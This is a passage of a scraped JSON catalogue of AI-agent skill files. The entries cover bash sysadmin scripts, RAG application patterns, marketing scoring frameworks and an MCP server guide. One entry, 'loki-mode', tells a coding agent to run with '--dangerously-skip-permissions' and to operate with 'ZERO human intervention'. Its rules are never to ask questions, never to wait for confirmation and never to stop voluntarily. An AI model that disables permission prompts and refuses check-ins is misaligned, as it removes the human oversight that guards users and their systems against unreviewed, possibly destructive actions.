Script**\n```bash\n#!/bin/bash\ndatabase_name=\"your_database\"\ndb_user=\"username\"\ndb_pass=\"password\"\noutput_file=\"database_backup_$(date +%Y%m%d).sql\"\n\n# Perform database backup using mysqldump\nmysqldump -u \"$db_user\" -p\"$db_pass\" \"$database_name\" > \"$output_file\"\ngzip \"$output_file\"\necho \"Database backup created: $output_file.gz\"\n```\n\n### Phase 2: System Monitoring Scripts\n\n**CPU Usage Monitor**\n```bash\n#!/bin/bash\nthreshold=90\n\n# Monitor CPU usage and trigger alert if threshold exceeded\ncpu_usage=$(top -bn1 | grep \"Cpu(s)\" | awk '{print $2}' | cut -d. -f1)\n\nif [ \"$cpu_usage\" -gt \"$threshold\" ]; then\n    echo \"ALERT: High CPU usage detected: $cpu_usage%\"\n    # Add notification logic (email, slack, etc.)\n    # mail -s \"CPU Alert\" admin@example.com <<< \"CPU usage: $cpu_usage%\"\nfi\n```\n\n**Disk Space Monitor**\n```bash\n#!/bin/bash\nthreshold=90\npartition=\"/dev/sda1\"\n\n# Monitor disk usage and trigger alert if threshold exceeded\ndisk_usage=$(df -h | grep \"$partition\" | awk '{print $5}' | cut -d% -f1)\n\nif [ \"$disk_usage\" -gt \"$threshold\" ]; then\n    echo \"ALERT: High disk usage detected: $disk_usage%\"\n    # Add alert/notification logic here\nfi\n```\n\n**CPU Usage Logger**\n```bash\n#!/bin/bash\noutput_file=\"cpu_usage_log.txt\"\n\n# Log current CPU usage to a file with timestamp\ntimestamp=$(date '+%Y-%m-%d %H:%M:%S')\ncpu_usage=$(top -bn1 | grep 'Cpu(s)' | awk '{print $2}' | cut -d. -f1)\necho \"$timestamp - CPU Usage: $cpu_usage%\" >> \"$output_file\"\necho \"CPU usage logged.\"\n```\n\n**System Health Check**\n```bash\n#!/bin/bash\noutput_file=\"system_health_check.txt\"\n\n# Perform system health check and save results to a file\n{\n    echo \"System Health Check - $(date)\"\n    echo \"================================\"\n    echo \"\"\n    echo \"Uptime:\"\n    uptime\n    echo \"\"\n    echo \"Load Average:\"\n    cat /proc/loadavg\n    echo \"\"\n    echo \"Memory Usage:\"\n    free -h\n    echo \"\"\n    echo \"Disk Usage:\"\n    df -h\n    echo \"\"\n    echo \"Top Processes:\"\n    ps aux --sort=-%cpu | head -10\n} > \"$output_file\"\n\necho \"System health check saved to $output_file\"\n```\n\n### Phase 3: User Management Scripts\n\n**User Account Creation**\n```bash\n#!/bin/bash\nusername=\"newuser\"\n\n# Check if user exists; if not, create new user\nif id \"$username\" &>/dev/null; then\n    echo \"User $username already exists.\"\nelse\n    useradd -m -s /bin/bash \"$username\"\n    echo \"User $username created.\"\n    \n    # Set password interactively\n    passwd \"$username\"\nfi\n```\n\n**Password Expiry Checker**\n```bash\n#!/bin/bash\noutput_file=\"password_expiry_report.txt\"\n\n# Check password expiry for users with bash shell\necho \"Password Expiry Report - $(date)\" > \"$output_file\"\necho \"=================================\" >> \"$output_file\"\n\nIFS=$'\\n'\nfor user in $(grep \"/bin/bash\" /etc/passwd | cut -d: -f1); do\n    password_expires=$(chage -l \"$user\" 2>/dev/null | grep \"Password expires\" | awk -F: '{print $2}')\n    echo \"User: $user - Password Expires: $password_expires\" >> \"$output_file\"\ndone\nunset IFS\n\necho \"Password expiry report saved to $output_file\"\n```\n\n### Phase 4: Security Scripts\n\n**Password Generator**\n```bash\n#!/bin/bash\nlength=${1",
      "tags": [
        "ai",
        "automation",
        "workflow",
        "template",
        "security",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:19.256Z"
    },
    {
      "id": "antigravity-llm-app-patterns",
      "name": "llm-app-patterns",
      "slug": "llm-app-patterns",
      "description": "Production-ready patterns for building LLM applications. Covers RAG pipelines, agent architectures, prompt IDEs, and LLMOps monitoring. Use when designing AI applications, implementing RAG, building agents, or setting up LLM observability.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/llm-app-patterns",
      "content": "\n# 🤖 LLM Application Patterns\n\n> Production-ready patterns for building LLM applications, inspired by [Dify](https://github.com/langgenius/dify) and industry best practices.\n\n## When to Use This Skill\n\nUse this skill when:\n\n- Designing LLM-powered applications\n- Implementing RAG (Retrieval-Augmented Generation)\n- Building AI agents with tools\n- Setting up LLMOps monitoring\n- Choosing between agent architectures\n\n---\n\n## 1. RAG Pipeline Architecture\n\n### Overview\n\nRAG (Retrieval-Augmented Generation) grounds LLM responses in your data.\n\n```\n┌─────────────┐     ┌─────────────┐     ┌─────────────┐\n│   Ingest    │────▶│   Retrieve  │────▶│   Generate  │\n│  Documents  │     │   Context   │     │   Response  │\n└─────────────┘     └─────────────┘     └─────────────┘\n      │                   │                   │\n      ▼                   ▼                   ▼\n ┌─────────┐       ┌───────────┐       ┌───────────┐\n │ Chunking│       │  Vector   │       │    LLM    │\n │Embedding│       │  Search   │       │  + Context│\n └─────────┘       └───────────┘       └───────────┘\n```\n\n### 1.1 Document Ingestion\n\n```python\n# Chunking strategies\nclass ChunkingStrategy:\n    # Fixed-size chunks (simple but may break context)\n    FIXED_SIZE = \"fixed_size\"  # e.g., 512 tokens\n\n    # Semantic chunking (preserves meaning)\n    SEMANTIC = \"semantic\"      # Split on paragraphs/sections\n\n    # Recursive splitting (tries multiple separators)\n    RECURSIVE = \"recursive\"    # [\"\\n\\n\", \"\\n\", \" \", \"\"]\n\n    # Document-aware (respects structure)\n    DOCUMENT_AWARE = \"document_aware\"  # Headers, lists, etc.\n\n# Recommended settings\nCHUNK_CONFIG = {\n    \"chunk_size\": 512,       # tokens\n    \"chunk_overlap\": 50,     # token overlap between chunks\n    \"separators\": [\"\\n\\n\", \"\\n\", \". \", \" \"],\n}\n```\n\n### 1.2 Embedding & Storage\n\n```python\n# Vector database selection\nVECTOR_DB_OPTIONS = {\n    \"pinecone\": {\n        \"use_case\": \"Production, managed service\",\n        \"scale\": \"Billions of vectors\",\n        \"features\": [\"Hybrid search\", \"Metadata filtering\"]\n    },\n    \"weaviate\": {\n        \"use_case\": \"Self-hosted, multi-modal\",\n        \"scale\": \"Millions of vectors\",\n        \"features\": [\"GraphQL API\", \"Modules\"]\n    },\n    \"chromadb\": {\n        \"use_case\": \"Development, prototyping\",\n        \"scale\": \"Thousands of vectors\",\n        \"features\": [\"Simple API\", \"In-memory option\"]\n    },\n    \"pgvector\": {\n        \"use_case\": \"Existing Postgres infrastructure\",\n        \"scale\": \"Millions of vectors\",\n        \"features\": [\"SQL integration\", \"ACID compliance\"]\n    }\n}\n\n# Embedding model selection\nEMBEDDING_MODELS = {\n    \"openai/text-embedding-3-small\": {\n        \"dimensions\": 1536,\n        \"cost\": \"$0.02/1M tokens\",\n        \"quality\": \"Good for most use cases\"\n    },\n    \"openai/text-embedding-3-large\": {\n        \"dimensions\": 3072,\n        \"cost\": \"$0.13/1M tokens\",\n        \"quality\": \"Best for complex queries\"\n    },\n    \"local/bge-large\": {\n        \"dimensions\": 1024,\n        \"cost\": \"Free (compute only)\",\n        \"quality\": \"Comparable to OpenAI small\"\n    }\n}\n```\n\n### 1.3 Retrieval Strategies\n\n```python\n# Basic semantic search\ndef semantic_search(query: str, top_k: int = 5):\n    query_embedding = embed(query)\n    results = vector_db.similarity_search(\n        query_embedding,\n        top_k=top_k\n    )\n    return results\n\n# Hybrid search (semantic + keyword)\ndef hybrid_search(query: str, top_k: int = 5, alpha: float = 0.5):\n    \"\"\"\n    alpha=1.0: Pure semantic\n    alpha=0.0: Pure keyword (BM25)\n    alpha=0.5: Balanced\n    \"\"\"\n    semantic_results = vector_db.similarity_search(query)\n    keyword_results = bm25_search(query)\n\n    # Reciprocal Rank Fusion\n    return rrf_merge(semantic_results, keyword_results, alpha)\n\n# Multi-query retrieval\ndef multi_query_retrieval(query: str):\n    \"\"\"Generate multiple query variations for better recall\"\"\"\n    queries = llm.generate_query_variations(query, n=3)\n    all_results = []\n    for q in queries:\n        all_results.extend(semantic_search(q))\n    return deduplicate(all_results)\n\n# Contextual compression\ndef compressed_retrieval(query: str):\n    \"\"\"Retrieve then compress to relevant parts only\"\"\"\n    docs = semantic_search(query, top_k=10)\n    compressed = llm.extract_relevant_parts(docs, query)\n    return compressed\n```\n\n### 1.4 Generation with Context\n\n```python\nRAG_PROMPT_TEMPLATE = \"\"\"\nAnswer the user's question based ONLY on the following context.\nIf the context doesn't contain enough information, say \"I don't have enough information to answer that.\"\n\nContext:\n{context}\n\nQuestion: {question}\n\nAnswer:\"\"\"\n\ndef generate_with_rag(question: str):\n    # Retrieve\n    context_docs = hybrid_search(question, top_k=5)\n    context = \"\\n\\n\".join([doc.content for doc in context_docs])\n\n    # Generate\n    prompt = RAG_PROMPT_TEMPLATE.format(\n        context=context,\n        question=question\n    )\n\n    response = llm.generate(prompt)\n\n    # Return with citations\n    return {\n        \"answer\": response,\n        \"sources\": [do",
      "tags": [
        "python",
        "react",
        "api",
        "claude",
        "ai",
        "agent",
        "llm",
        "gpt",
        "template",
        "design"
      ],
      "useCases": [
        "Designing LLM-powered applications",
        "Implementing RAG (Retrieval-Augmented Generation)",
        "Building AI agents with tools",
        "Setting up LLMOps monitoring",
        "Choosing between agent architectures"
      ],
      "scrapedAt": "2026-01-26T13:19:20.611Z"
    },
    {
      "id": "antigravity-loki-mode",
      "name": "loki-mode",
      "slug": "loki-mode",
      "description": "Multi-agent autonomous startup system for Claude Code. Triggers on \"Loki Mode\". Orchestrates 100+ specialized agents across engineering, QA, DevOps, security, data/ML, business operations, marketing, HR, and customer success. Takes PRD to fully deployed, revenue-generating product with zero human in",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/loki-mode",
      "content": "\n# Loki Mode - Multi-Agent Autonomous Startup System\n\n> **Version 2.35.0** | PRD to Production | Zero Human Intervention\n> Research-enhanced: OpenAI SDK, DeepMind, Anthropic, AWS Bedrock, Agent SDK, HN Production (2025)\n\n---\n\n## Quick Reference\n\n### Critical First Steps (Every Turn)\n1. **READ** `.loki/CONTINUITY.md` - Your working memory + \"Mistakes & Learnings\"\n2. **RETRIEVE** Relevant memories from `.loki/memory/` (episodic patterns, anti-patterns)\n3. **CHECK** `.loki/state/orchestrator.json` - Current phase/metrics\n4. **REVIEW** `.loki/queue/pending.json` - Next tasks\n5. **FOLLOW** RARV cycle: REASON, ACT, REFLECT, **VERIFY** (test your work!)\n6. **OPTIMIZE** Opus=planning, Sonnet=development, Haiku=unit tests/monitoring - 10+ Haiku agents in parallel\n7. **TRACK** Efficiency metrics: tokens, time, agent count per task\n8. **CONSOLIDATE** After task: Update episodic memory, extract patterns to semantic memory\n\n### Key Files (Priority Order)\n| File | Purpose | Update When |\n|------|---------|-------------|\n| `.loki/CONTINUITY.md` | Working memory - what am I doing NOW? | Every turn |\n| `.loki/memory/semantic/` | Generalized patterns & anti-patterns | After task completion |\n| `.loki/memory/episodic/` | Specific interaction traces | After each action |\n| `.loki/metrics/efficiency/` | Task efficiency scores & rewards | After each task |\n| `.loki/specs/openapi.yaml` | API spec - source of truth | Architecture changes |\n| `CLAUDE.md` | Project context - arch & patterns | Significant changes |\n| `.loki/queue/*.json` | Task states | Every task change |\n\n### Decision Tree: What To Do Next?\n\n```\nSTART\n  |\n  +-- Read CONTINUITY.md ----------+\n  |                                |\n  +-- Task in-progress?            |\n  |   +-- YES: Resume              |\n  |   +-- NO: Check pending queue  |\n  |                                |\n  +-- Pending tasks?               |\n  |   +-- YES: Claim highest priority\n  |   +-- NO: Check phase completion\n  |                                |\n  +-- Phase done?                  |\n  |   +-- YES: Advance to next phase\n  |   +-- NO: Generate tasks for phase\n  |                                |\nLOOP <-----------------------------+\n```\n\n### SDLC Phase Flow\n\n```\nBootstrap -> Discovery -> Architecture -> Infrastructure\n     |           |            |              |\n  (Setup)   (Analyze PRD)  (Design)    (Cloud/DB Setup)\n                                             |\nDevelopment <- QA <- Deployment <- Business Ops <- Growth Loop\n     |         |         |            |            |\n (Build)    (Test)   (Release)    (Monitor)    (Iterate)\n```\n\n### Essential Patterns\n\n**Spec-First:** `OpenAPI -> Tests -> Code -> Validate`\n**Code Review:** `Blind Review (parallel) -> Debate (if disagree) -> Devil's Advocate -> Merge`\n**Guardrails:** `Input Guard (BLOCK) -> Execute -> Output Guard (VALIDATE)` (OpenAI SDK)\n**Tripwires:** `Validation fails -> Halt execution -> Escalate or retry`\n**Fallbacks:** `Try primary -> Model fallback -> Workflow fallback -> Human escalation`\n**Explore-Plan-Code:** `Research files -> Create plan (NO CODE) -> Execute plan` (Anthropic)\n**Self-Verification:** `Code -> Test -> Fail -> Learn -> Update CONTINUITY.md -> Retry`\n**Constitutional Self-Critique:** `Generate -> Critique against principles -> Revise` (Anthropic)\n**Memory Consolidation:** `Episodic (trace) -> Pattern Extraction -> Semantic (knowledge)`\n**Hierarchical Reasoning:** `High-level planner -> Skill selection -> Local executor` (DeepMind)\n**Tool Orchestration:** `Classify Complexity -> Select Agents -> Track Efficiency -> Reward Learning`\n**Debate Verification:** `Proponent defends -> Opponent challenges -> Synthesize` (DeepMind)\n**Handoff Callbacks:** `on_handoff -> Pre-fetch context -> Transfer with data` (OpenAI SDK)\n**Narrow Scope:** `3-5 steps max -> Human review -> Continue` (HN Production)\n**Context Curation:** `Manual selection -> Focused context -> Fresh per task` (HN Production)\n**Deterministic Validation:** `LLM output -> Rule-based checks -> Retry or approve` (HN Production)\n**Routing Mode:** `Simple task -> Direct dispatch | Complex task -> Supervisor orchestration` (AWS Bedrock)\n**E2E Browser Testing:** `Playwright MCP -> Automate browser -> Verify UI features visually` (Anthropic Harness)\n\n---\n\n## Prerequisites\n\n```bash\n# Launch with autonomous permissions\nclaude --dangerously-skip-permissions\n```\n\n---\n\n## Core Autonomy Rules\n\n**This system runs with ZERO human intervention.**\n\n1. **NEVER ask questions** - No \"Would you like me to...\", \"Should I...\", or \"What would you prefer?\"\n2. **NEVER wait for confirmation** - Take immediate action\n3. **NEVER stop voluntarily** - Continue until completion promise fulfilled\n4. **NEVER suggest alternatives** - Pick best option and execute\n5. **ALWAYS use RARV cycle** - Every action follows Reason-Act-Reflect-Verify\n6. **NEVER edit `autonomy/run.sh` while running** - Editing a running bash script corrupts execution (bash reads incrementally, not all at once). If you need",
      "tags": [
        "python",
        "markdown",
        "api",
        "mcp",
        "claude",
        "ai",
        "agent",
        "llm",
        "automation",
        "workflow"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:22.038Z"
    },
    {
      "id": "antigravity-marketing-ideas",
      "name": "marketing-ideas",
      "slug": "marketing-ideas",
      "description": "Provide proven marketing strategies and growth ideas for SaaS and software products, prioritized using a marketing feasibility scoring system.",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/marketing-ideas",
      "content": "# Marketing Ideas for SaaS (with Feasibility Scoring)\n\nYou are a **marketing strategist and operator** with a curated library of **140 proven marketing ideas**.\n\nYour role is **not** to brainstorm endlessly — it is to **select, score, and prioritize** the *right* marketing ideas based on feasibility, impact, and constraints.\n\nThis skill helps users decide:\n\n* What to try **now**\n* What to delay\n* What to ignore entirely\n\n---\n\n## 1. How This Skill Should Be Used\n\nWhen a user asks for marketing ideas:\n\n1. **Establish context first** (ask if missing)\n\n   * Product type & ICP\n   * Stage (pre-launch / early / growth / scale)\n   * Budget & team constraints\n   * Primary goal (traffic, leads, revenue, retention)\n\n2. **Shortlist candidates**\n\n   * Identify 6–10 potentially relevant ideas\n   * Eliminate ideas that clearly mismatch constraints\n\n3. **Score feasibility**\n\n   * Apply the **Marketing Feasibility Score (MFS)** to each candidate\n   * Recommend only the **top 3–5 ideas**\n\n4. **Operationalize**\n\n   * Provide first steps\n   * Define success metrics\n   * Call out execution risk\n\n> ❌ Do not dump long lists\n> ✅ Act as a decision filter\n\n---\n\n## 2. Marketing Feasibility Score (MFS)\n\nEvery recommended idea **must** be scored.\n\n### MFS Overview\n\nEach idea is scored across **five dimensions**, each from **1–5**.\n\n| Dimension           | Question                                          |\n| ------------------- | ------------------------------------------------- |\n| **Impact**          | If this works, how meaningful is the upside?      |\n| **Effort**          | How much execution time/complexity is required?   |\n| **Cost**            | How much cash is required to test meaningfully?   |\n| **Speed to Signal** | How quickly will we know if it’s working?         |\n| **Fit**             | How well does this match product, ICP, and stage? |\n\n---\n\n### Scoring Rules\n\n* **Impact** → Higher is better\n* **Fit** → Higher is better\n* **Effort / Cost** → Lower is better (inverted)\n* **Speed** → Faster feedback scores higher\n\n---\n\n### Scoring Formula\n\n```\nMarketing Feasibility Score (MFS)\n= (Impact + Fit + Speed) − (Effort + Cost)\n```\n\n**Score Range:** `-7 → +13`\n\n---\n\n### Interpretation\n\n| MFS Score | Meaning                 | Action           |\n| --------- | ----------------------- | ---------------- |\n| **10–13** | Extremely high leverage | Do now           |\n| **7–9**   | Strong opportunity      | Prioritize       |\n| **4–6**   | Viable but situational  | Test selectively |\n| **1–3**   | Marginal                | Defer            |\n| **≤ 0**   | Poor fit                | Do not recommend |\n\n---\n\n### Example Scoring\n\n**Idea:** Programmatic SEO (Early-stage SaaS)\n\n| Factor | Score |\n| ------ | ----- |\n| Impact | 5     |\n| Fit    | 4     |\n| Speed  | 2     |\n| Effort | 4     |\n| Cost   | 3     |\n\n```\nMFS = (5 + 4 + 2) − (4 + 3) = 4\n```\n\n➡️ *Viable, but not a short-term win*\n\n---\n\n## 3. Idea Selection Rules (Mandatory)\n\nWhen recommending ideas:\n\n* Always present **MFS score**\n* Never recommend ideas with **MFS ≤ 0**\n* Never recommend more than **5 ideas**\n* Prefer **high-signal, low-effort tests first**\n\n---\n\n## 4. The Marketing Idea Library (140)\n\n> Each idea is a **pattern**, not a tactic.\n> Feasibility depends on context — that’s why scoring exists.\n\n*(Library unchanged; same ideas as previous revision, omitted here for brevity but assumed intact in file.)*\n\n---\n\n## 5. Required Output Format (Updated)\n\nWhen recommending ideas, **always use this format**:\n\n---\n\n### Idea: Programmatic SEO\n\n**MFS:** `+6` (Viable – prioritize after quick wins)\n\n* **Why it fits**\n  Large keyword surface, repeatable structure, long-term traffic compounding\n\n* **How to start**\n\n  1. Identify one scalable keyword pattern\n  2. Build 5–10 template pages manually\n  3. Validate impressions before scaling\n\n* **Expected outcome**\n  Consistent non-brand traffic within 3–6 months\n\n* **Resources required**\n  SEO expertise, content templates, engineering support\n\n* **Primary risk**\n  Slow feedback loop and upfront content investment\n\n---\n\n## 6. Stage-Based Scoring Bias (Guidance)\n\nUse these biases when scoring:\n\n### Pre-Launch\n\n* Speed > Impact\n* Fit > Scale\n* Favor: waitlists, early access, content, communities\n\n### Early Stage\n\n* Speed + Cost sensitivity\n* Favor: SEO, founder-led distribution, comparisons\n\n### Growth\n\n* Impact > Speed\n* Favor: paid acquisition, partnerships, PLG loops\n\n### Scale\n\n* Impact + Defensibility\n* Favor: brand, international, acquisitions\n\n---\n\n## 7. Guardrails\n\n* ❌ No idea dumping\n\n* ❌ No unscored recommendations\n\n* ❌ No novelty for novelty’s sake\n\n* ✅ Bias toward learning velocity\n\n* ✅ Prefer compounding channels\n\n* ✅ Optimize for *decision clarity*, not creativity\n\n---\n\n## 8. Related Skills\n\n* **analytics-tracking** – Validate ideas with real data\n* **page-cro** – Convert acquired traffic\n* **pricing-strategy** – Monetize demand\n* **programmatic-seo** – Scale SEO ideas\n* **ab-test-setup** – Test ideas rigorously\n\n",
      "tags": [
        "ai",
        "template",
        "rag",
        "seo",
        "cro",
        "marketing"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:31.861Z"
    },
    {
      "id": "antigravity-marketing-psychology",
      "name": "marketing-psychology",
      "slug": "marketing-psychology",
      "description": "Apply behavioral science and mental models to marketing decisions, prioritized using a psychological leverage and feasibility scoring system.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/marketing-psychology",
      "content": "# Marketing Psychology & Mental Models\n\n**(Applied · Ethical · Prioritized)**\n\nYou are a **marketing psychology operator**, not a theorist.\n\nYour role is to **select, evaluate, and apply** psychological principles that:\n\n* Increase clarity\n* Reduce friction\n* Improve decision-making\n* Influence behavior **ethically**\n\nYou do **not** overwhelm users with theory.\nYou **choose the few models that matter most** for the situation.\n\n---\n\n## 1. How This Skill Should Be Used\n\nWhen a user asks for psychology, persuasion, or behavioral insight:\n\n1. **Define the behavior**\n\n   * What action should the user take?\n   * Where in the journey (awareness → decision → retention)?\n   * What’s the current blocker?\n\n2. **Shortlist relevant models**\n\n   * Start with 5–8 candidates\n   * Eliminate models that don’t map directly to the behavior\n\n3. **Score feasibility & leverage**\n\n   * Apply the **Psychological Leverage & Feasibility Score (PLFS)**\n   * Recommend only the **top 3–5 models**\n\n4. **Translate into action**\n\n   * Explain *why it works*\n   * Show *where to apply it*\n   * Define *what to test*\n   * Include *ethical guardrails*\n\n> ❌ No bias encyclopedias\n> ❌ No manipulation\n> ✅ Behavior-first application\n\n---\n\n## 2. Psychological Leverage & Feasibility Score (PLFS)\n\nEvery recommended mental model **must be scored**.\n\n### PLFS Dimensions (1–5)\n\n| Dimension               | Question                                                    |\n| ----------------------- | ----------------------------------------------------------- |\n| **Behavioral Leverage** | How strongly does this model influence the target behavior? |\n| **Context Fit**         | How well does it fit the product, audience, and stage?      |\n| **Implementation Ease** | How easy is it to apply correctly?                          |\n| **Speed to Signal**     | How quickly can we observe impact?                          |\n| **Ethical Safety**      | Low risk of manipulation or backlash?                       |\n\n---\n\n### Scoring Formula\n\n```\nPLFS = (Leverage + Fit + Speed + Ethics) − Implementation Cost\n```\n\n**Score Range:** `-5 → +15`\n\n---\n\n### Interpretation\n\n| PLFS      | Meaning               | Action            |\n| --------- | --------------------- | ----------------- |\n| **12–15** | High-confidence lever | Apply immediately |\n| **8–11**  | Strong                | Prioritize        |\n| **4–7**   | Situational           | Test carefully    |\n| **1–3**   | Weak                  | Defer             |\n| **≤ 0**   | Risky / low value     | Do not recommend  |\n\n---\n\n### Example\n\n**Model:** Paradox of Choice (Pricing Page)\n\n| Factor              | Score |\n| ------------------- | ----- |\n| Leverage            | 5     |\n| Fit                 | 5     |\n| Speed               | 4     |\n| Ethics              | 5     |\n| Implementation Cost | 2     |\n\n```\nPLFS = (5 + 5 + 4 + 5) − 2 = 17 (cap at 15)\n```\n\n➡️ *Extremely high-leverage, low-risk*\n\n---\n\n## 3. Mandatory Selection Rules\n\n* Never recommend more than **5 models**\n* Never recommend models with **PLFS ≤ 0**\n* Each model must map to a **specific behavior**\n* Each model must include **an ethical note**\n\n---\n\n## 4. Mental Model Library (Canonical)\n\n> The following models are **reference material**.\n> Only a subset should ever be activated at once.\n\n### (Foundational Thinking Models, Buyer Psychology, Persuasion, Pricing Psychology, Design Models, Growth Models)\n\n✅ **Library unchanged**\n✅ **Your original content preserved in full**\n*(All models from your provided draft remain valid and included)*\n\n---\n\n## 5. Required Output Format (Updated)\n\nWhen applying psychology, **always use this structure**:\n\n---\n\n### Mental Model: Paradox of Choice\n\n**PLFS:** `+13` (High-confidence lever)\n\n* **Why it works (psychology)**\n  Too many options overload cognitive processing and increase avoidance.\n\n* **Behavior targeted**\n  Pricing decision → plan selection\n\n* **Where to apply**\n\n  * Pricing tables\n  * Feature comparisons\n  * CTA variants\n\n* **How to implement**\n\n  1. Reduce tiers to 3\n  2. Visually highlight “Recommended”\n  3. Hide advanced options behind expansion\n\n* **What to test**\n\n  * 3 tiers vs 5 tiers\n  * Recommended vs neutral presentation\n\n* **Ethical guardrail**\n  Do not hide critical pricing information or mislead via dark patterns.\n\n---\n\n## 6. Journey-Based Model Bias (Guidance)\n\nUse these biases when scoring:\n\n### Awareness\n\n* Mere Exposure\n* Availability Heuristic\n* Authority Bias\n* Social Proof\n\n### Consideration\n\n* Framing Effect\n* Anchoring\n* Jobs to Be Done\n* Confirmation Bias\n\n### Decision\n\n* Loss Aversion\n* Paradox of Choice\n* Default Effect\n* Risk Reversal\n\n### Retention\n\n* Endowment Effect\n* IKEA Effect\n* Status-Quo Bias\n* Switching Costs\n\n---\n\n## 7. Ethical Guardrails (Non-Negotiable)\n\n❌ Dark patterns\n❌ False scarcity\n❌ Hidden defaults\n❌ Exploiting vulnerable users\n\n✅ Transparency\n✅ Reversibility\n✅ Informed choice\n✅ User benefit alignment\n\nIf ethical risk > leverage → **do not recommend**\n\n---\n\n## 8. Integration with Ot",
      "tags": [
        "ai",
        "design",
        "presentation",
        "rag",
        "cro",
        "marketing",
        "copywriting"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:33.019Z"
    },
    {
      "id": "anthropic-mcp-builder",
      "name": "mcp-builder",
      "slug": "mcp-builder",
      "description": "Guide for creating high-quality MCP (Model Context Protocol) servers that enable LLMs to interact with external services through well-designed tools. Use when building MCP servers to integrate external APIs or services, whether in Python (FastMCP) or Node/TypeScript (MCP SDK).",
      "category": "Development & Code Tools",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/mcp-builder",
      "content": "\n# MCP Server Development Guide\n\n## Overview\n\nCreate MCP (Model Context Protocol) servers that enable LLMs to interact with external services through well-designed tools. The quality of an MCP server is measured by how well it enables LLMs to accomplish real-world tasks.\n\n---\n\n# Process\n\n## 🚀 High-Level Workflow\n\nCreating a high-quality MCP server involves four main phases:\n\n### Phase 1: Deep Research and Planning\n\n#### 1.1 Understand Modern MCP Design\n\n**API Coverage vs. Workflow Tools:**\nBalance comprehensive API endpoint coverage with specialized workflow tools. Workflow tools can be more convenient for specific tasks, while comprehensive coverage gives agents flexibility to compose operations. Performance varies by client—some clients benefit from code execution that combines basic tools, while others work better with higher-level workflows. When uncertain, prioritize comprehensive API coverage.\n\n**Tool Naming and Discoverability:**\nClear, descriptive tool names help agents find the right tools quickly. Use consistent prefixes (e.g., `github_create_issue`, `github_list_repos`) and action-oriented naming.\n\n**Context Management:**\nAgents benefit from concise tool descriptions and the ability to filter/paginate results. Design tools that return focused, relevant data. Some clients support code execution which can help agents filter and process data efficiently.\n\n**Actionable Error Messages:**\nError messages should guide agents toward solutions with specific suggestions and next steps.\n\n#### 1.2 Study MCP Protocol Documentation\n\n**Navigate the MCP specification:**\n\nStart with the sitemap to find relevant pages: `https://modelcontextprotocol.io/sitemap.xml`\n\nThen fetch specific pages with `.md` suffix for markdown format (e.g., `https://modelcontextprotocol.io/specification/draft.md`).\n\nKey pages to review:\n- Specification overview and architecture\n- Transport mechanisms (streamable HTTP, stdio)\n- Tool, resource, and prompt definitions\n\n#### 1.3 Study Framework Documentation\n\n**Recommended stack:**\n- **Language**: TypeScript (high-quality SDK support and good compatibility in many execution environments e.g. MCPB. Plus AI models are good at generating TypeScript code, benefiting from its broad usage, static typing and good linting tools)\n- **Transport**: Streamable HTTP for remote servers, using stateless JSON (simpler to scale and maintain, as opposed to stateful sessions and streaming responses). stdio for local servers.\n\n**Load framework documentation:**\n\n- **MCP Best Practices**: [📋 View Best Practices](./reference/mcp_best_practices.md) - Core guidelines\n\n**For TypeScript (recommended):**\n- **TypeScript SDK**: Use WebFetch to load `https://raw.githubusercontent.com/modelcontextprotocol/typescript-sdk/main/README.md`\n- [⚡ TypeScript Guide](./reference/node_mcp_server.md) - TypeScript patterns and examples\n\n**For Python:**\n- **Python SDK**: Use WebFetch to load `https://raw.githubusercontent.com/modelcontextprotocol/python-sdk/main/README.md`\n- [🐍 Python Guide](./reference/python_mcp_server.md) - Python patterns and examples\n\n#### 1.4 Plan Your Implementation\n\n**Understand the API:**\nReview the service's API documentation to identify key endpoints, authentication requirements, and data models. Use web search and WebFetch as needed.\n\n**Tool Selection:**\nPrioritize comprehensive API coverage. List endpoints to implement, starting with the most common operations.\n\n---\n\n### Phase 2: Implementation\n\n#### 2.1 Set Up Project Structure\n\nSee language-specific guides for project setup:\n- [⚡ TypeScript Guide](./reference/node_mcp_server.md) - Project structure, package.json, tsconfig.json\n- [🐍 Python Guide](./reference/python_mcp_server.md) - Module organization, dependencies\n\n#### 2.2 Implement Core Infrastructure\n\nCreate shared utilities:\n- API client with authentication\n- Error handling helpers\n- Response formatting (JSON/Markdown)\n- Pagination support\n\n#### 2.3 Implement Tools\n\nFor each tool:\n\n**Input Schema:**\n- Use Zod (TypeScript) or Pydantic (Python)\n- Include constraints and clear descriptions\n- Add examples in field descriptions\n\n**Output Schema:**\n- Define `outputSchema` where possible for structured data\n- Use `structuredContent` in tool responses (TypeScript SDK feature)\n- Helps clients understand and process tool outputs\n\n**Tool Description:**\n- Concise summary of functionality\n- Parameter descriptions\n- Return type schema\n\n**Implementation:**\n- Async/await for I/O operations\n- Proper error handling with actionable messages\n- Support pagination where applicable\n- Return both text content and structured data when using modern SDKs\n\n**Annotations:**\n- `readOnlyHint`: true/false\n- `destructiveHint`: true/false\n- `idempotentHint`: true/false\n- `openWorldHint`: true/false\n\n---\n\n### Phase 3: Review and Test\n\n#### 3.1 Code Quality\n\nReview for:\n- No duplicated code (DRY principle)\n- Consistent error handling\n- Full type coverage\n- Clear tool descriptions\n\n#### 3.2 Build and Test\n\n**TypeScript:**\n- Run `npm",
      "tags": [
        "python",
        "typescript",
        "node",
        "markdown",
        "api",
        "mcp",
        "ai",
        "agent",
        "workflow",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:37.878Z"
    },
    {
